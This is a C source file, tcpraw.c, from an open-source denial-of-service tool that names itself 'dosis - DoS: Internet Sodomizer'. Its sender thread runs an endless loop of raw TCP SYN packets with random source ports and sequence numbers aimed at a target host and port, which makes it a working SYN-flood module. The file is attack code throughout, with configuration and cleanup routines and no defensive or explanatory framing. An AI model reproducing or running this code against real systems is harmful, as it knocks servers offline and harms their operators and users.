/*****************************************************************************
 * tcpraw.c
 *
 * DoS on TCP servers by raw tcp packets (synflood?).
 *
 * ---------------------------------------------------------------------------
 * dosis - DoS: Internet Sodomizer
 *   (C) 2008-2009 Gerardo García Peña <gerardo@kung-foo.dhs.org>
 *
 *   This program is free software; you can redistribute it and/or modify it
 *   under the terms of the GNU General Public License as published by the Free
 *   Software Foundation; either version 2 of the License, or (at your option)
 *   any later version.
 *
 *   This program is distributed in the hope that it will be useful, but WITHOUT
 *   ANY WARRANTY; without even the implied warranty of MERCHANTABILITY or
 *   FITNESS FOR A PARTICULAR PURPOSE.  See the GNU General Public License for
 *   more details.
 *
 *   You should have received a copy of the GNU General Public License along
 *   with this program; if not, write to the Free Software Foundation, Inc., 51
 *   Franklin Street, Fifth Floor, Boston, MA  02110-1301  USA
 *
 *****************************************************************************/

#include <config.h>

#include "dosis.h"
#include "dosconfig.h"
#include "tcpraw.h"
#include "lnet.h"
#include "pthreadex.h"
#include "log.h"
#include "ip.h"

typedef struct _tag_TCPRAW_CFG {
  INET_ADDR          shost;
  INET_ADDR          dhost;
  unsigned           npackets;
  char               req;
  unsigned           req_size;
  double             hitratio;

  pthreadex_timer_t  timer;
  LN_CONTEXT        *lnc;
} TCPRAW_CFG;

static void tcpraw__thread(THREAD_WORK *tw)
{
  TCPRAW_CFG *tc = (TCPRAW_CFG *) tw->data;
  unsigned int seq = libnet_get_prand(LIBNET_PRu32);
  int i;

  DBG("[%02u] Started sender thread", tw->id);

  /* ATTACK */
  while(1)
  {
    /* wait for work */
    if(tc->hitratio > 0)
      if(pthreadex_timer_wait(&(tc->timer)) < 0)
        ERR("Error at pthreadex_timer_wait(): %s", strerror(errno));

    /* build TCP packet with payload (if requested) */
    DBG("[%02u] Sending %d packets...", tw->id, tc->npackets);
    for(i = 0; i < tc->npackets; i++)
    {
      seq += libnet_get_prand(LIBNET_PRu16) & 0x00ff;
      ln_send_packet(tc->lnc,
                     &tc->shost.addr.in.inaddr, libnet_get_prand(LIBNET_PRu16),
                     &tc->dhost.addr.in.inaddr, tc->dhost.port,
                     TH_SYN, 13337,
                     seq, 0,
                     NULL, 0);
    }
  }
}

/*+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
 * GENERIC HHTP THREAD
 *   This thread specializes in different tasks depending on thread number
 *     0 - listener
 *     x - sender
 *+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++*/

static int tcpraw__configure(THREAD_WORK *tw, SNODE *command)
{
  TCPRAW_CFG *tc = (TCPRAW_CFG *) tw->data;

  /* initialize specialized work thread data */
  if(tc == NULL)
  {
    if((tc = calloc(1, sizeof(TCPRAW_CFG))) == NULL)
      D_FAT("[%02d] No memory for TCPOPEN_CFG.", tw->id);
    tw->data = (void *) tc;

    /* initialize libnet */
    DBG("[%02u] Initializing libnet.", tw->id);
    if((tc->lnc = calloc(1, sizeof(LN_CONTEXT))) == NULL)
      D_FAT("[%02d] No memory for LN_CONTEXT.", tw->id);
    ln_init_context(tc->lnc);

  }

  /* read from SNODE command */
  pthreadex_timer_init(&(tc->timer), 0.0);
  if(tc->hitratio > 0)
    pthreadex_timer_set_frequency(&(tc->timer), tc->hitratio);

  return 0;
}

static void tcpraw__cleanup(THREAD_WORK *tw)
{
  TCPRAW_CFG *tc = (TCPRAW_CFG *) tw->data;

  /* collect libnet data */
  ln_destroy_context(tc->lnc);
  pthreadex_timer_destroy(&tc->timer);

  DBG("[%02u] Finalized.", tw->id);
}

/*+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
 * TCPRAW TEA OBJECT
 *+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++*/

TEA_OBJECT teaTCPRAW = {
  .configure = tcpraw__configure,
  .cleanup   = tcpraw__cleanup,
  .thread    = tcpraw__thread,
};

